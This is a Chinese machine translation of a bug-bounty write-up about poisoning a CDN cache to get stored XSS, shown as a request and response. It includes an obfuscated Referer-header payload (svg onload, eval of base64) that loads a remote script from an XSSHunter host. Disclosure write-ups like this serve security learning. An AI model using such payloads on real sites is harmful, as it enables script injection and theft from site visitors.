<html>
<head>
<title>How I Made $16,500 Hacking CDN Caching Servers — Part 1</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我如何通过入侵CDN缓存服务器赚到16500美元——第1部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-i-made-15-000-by-hacking-caching-servers-part-1-5541712a61c3?source=collection_archive---------0-----------------------#2022-01-29">https://infosecwriteups.com/how-i-made-15-000-by-hacking-caching-servers-part-1-5541712a61c3?source=collection_archive---------0-----------------------#2022-01-29</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="8c55" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">@bxmbn</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi kf"><img src="../Images/0e9c917ff9ee765e0488c6c45b3afa3b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1220/format:webp/1*pyZEcnS5fLESc8yUS4wbdA.png"/></div></figure></div><div class="ab cl kn ko hu kp" role="separator"><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks"/></div><div class="ij ik il im in"><h1 id="5302" class="ku kv iq bd kw kx ky kz la lb lc ld le jw lf jx lg jz lh ka li kc lj kd lk ll bi translated"><em class="lm">缓存中毒到存储的XSS </em></h1><blockquote class="ln lo lp"><p id="f888" class="lq lr ls lt b lu lv jr lw lx ly ju lz ma mb mc md me mf mg mh mi mj mk ml mm ij bi translated"><em class="iq">赏金:6300美元</em></p></blockquote><p id="6a00" class="pw-post-body-paragraph lq lr iq lt b lu lv jr lw lx ly ju lz mn mb mc md mo mf mg mh mp mj mk ml mm ij bi translated">这实际上是我的第一次缓存中毒，我最初报告它是一个缓存欺骗问题，因为这是我当时所知道的关于缓存利用的所有信息，以及为什么这最终被分类并作为缓存中毒奖励给存储的XSS的原因，是因为分类者打开了我的眼睛，告诉我寻找一个自我XSS，所以它可以被分类为高或关键。</p><p id="0824" class="pw-post-body-paragraph lq lr iq lt b lu lv jr lw lx ly ju lz mn mb mc md mo mf mg mh mp mj mk ml mm ij bi translated">我能够通过Referer头注入Javascript，但攻击者仍然需要将中毒的URL发送给受害者，因为URL需要被攻击者修改，所以缓存服务器可以保存它。</p><p id="6b32" class="pw-post-body-paragraph lq lr iq lt b lu lv jr lw lx ly ju lz mn mb mc md mo mf mg mh mp mj mk ml mm ij bi translated">经过一番谷歌搜索，我找到了一个直接被缓存的URL，没有任何扩展名。这就是我所需要的一切，:D</p><p id="c6d2" class="pw-post-body-paragraph lq lr iq lt b lu lv jr lw lx ly ju lz mn mb mc md mo mf mg mh mp mj mk ml mm ij bi translated">我迅速更新了报告。</p><p id="478c" class="pw-post-body-paragraph lq lr iq lt b lu lv jr lw lx ly ju lz mn mb mc md mo mf mg mh mp mj mk ml mm ij bi translated">通过保存我的XSSHunter有效负载而没有任何“缓存破坏者”(？param=123)然后，对缓存服务器计时，直到它刷新并发送请求。</p><h2 id="2e9f" class="mq kv iq bd kw mr ms dn la mt mu dp le mn mv mw lg mo mx my li mp mz na lk nb bi translated">请求:</h2><pre class="kg kh ki kj gt nc nd ne nf aw ng bi"><span id="4ec8" class="mq kv iq nd b gy nh ni l nj nk">GET /xxxx/xxxx/xxx HTTP/2<br/>Host: Redacted<br/>Referer: ?&lt;/script&gt;&lt;svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=&gt;<br/>...</span></pre><h2 id="7291" class="mq kv iq bd kw mr ms dn la mt mu dp le mn mv mw lg mo mx my li mp mz na lk nb bi translated">回应:</h2><pre class="kg kh ki kj gt nc nd ne nf aw ng bi"><span id="e296" class="mq kv iq nd b gy nh ni l nj nk">HTTP/2 200 Ok</span><span id="7f6f" class="mq kv iq nd b gy nl ni l nj nk">...<br/>Content-Type: text/html; charset=utf-8<br/>X-Cache: HIT<br/>...</span><span id="a065" class="mq kv iq nd b gy nl ni l nj nk">&lt;html&gt;</span><span id="6e5d" class="mq kv iq nd b gy nl ni l nj nk">...</span><span id="2112" class="mq kv iq nd b gy nl ni l nj nk">&lt;script&gt;</span><span id="5ce1" class="mq kv iq nd b gy nl ni l nj nk">...</span><span id="b656" class="mq kv iq nd b gy nl ni l nj nk">"Referer":"?&lt;/script&gt;<br/>&lt;svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=&gt;</span><span id="c074" class="mq kv iq nd b gy nl ni l nj nk">...</span></pre><p id="eb9d" class="pw-post-body-paragraph lq lr iq lt b lu lv jr lw lx ly ju lz mn mb mc md mo mf mg mh mp mj mk ml mm ij bi translated">第二天醒来，我收到了来自XSSHunter的35个通知，令我惊讶的是，其中4个是在不同的子域上被解雇的。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nn no di np bf nq"><div class="gh gi nm"><img src="../Images/0d6aa9062c783584537d91871022616d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G7CSoZwfASUF08fXxC0vhA.png"/></div></div></figure></div><div class="ab cl kn ko hu kp" role="separator"><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks"/></div><div class="ij ik il im in"><h1 id="b1cd" class="ku kv iq bd kw kx ky kz la lb lc ld le jw lf jx lg jz lh ka li kc lj kd lk ll bi translated"><strong class="ak"> <em class="lm">时间轴:</em> </strong></h1><blockquote class="ln lo lp"><p id="2701" class="lq lr ls lt b lu lv jr lw lx ly ju lz ma mb mc md me mf mg mh mi mj mk ml mm ij bi translated">报道→2021年11月7日</p><p id="7870" class="lq lr ls lt b lu lv jr lw lx ly ju lz ma mb mc md me mf mg mh mi mj mk ml mm ij bi translated">分流→2021年11月11日</p><p id="a693" class="lq lr ls lt b lu lv jr lw lx ly ju lz ma mb mc md me mf mg mh mi mj mk ml mm ij bi translated">悬赏奖金→2021年11月17日</p></blockquote></div><div class="ab cl kn ko hu kp" role="separator"><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks"/></div><div class="ij ik il im in"><h1 id="e65b" class="ku kv iq bd kw kx ky kz la lb lc ld le jw lf jx lg jz lh ka li kc lj kd lk ll bi translated">接下来:</h1><p id="6acb" class="pw-post-body-paragraph lq lr iq lt b lu nr jr lw lx ns ju lz mn nt mc md mo nu mg mh mp nv mk ml mm ij bi translated">第2部分:隐藏XSS的好方法</p></div><div class="ab cl kn ko hu kp" role="separator"><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks"/></div><div class="ij ik il im in"><h1 id="9905" class="ku kv iq bd kw kx ky kz la lb lc ld le jw lf jx lg jz lh ka li kc lj kd lk ll bi translated">🔈 🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。<a class="ae nw" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">查看更多详情并在此注册。</a></h1><div class="nx ny gp gr nz oa"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="ob ab fo"><div class="oc ab od cl cj oe"><h2 class="bd ir gy z fp of fr fs og fu fw ip bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="oh l"><h3 class="bd b gy z fp of fr fs og fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="oi l"><p class="bd b dl z fp of fr fs og fu fw dk translated">iwcon.live</p></div></div><div class="oj l"><div class="ok l ol om on oj oo kl oa"/></div></div></a></div></div></div>    
</body>
</html>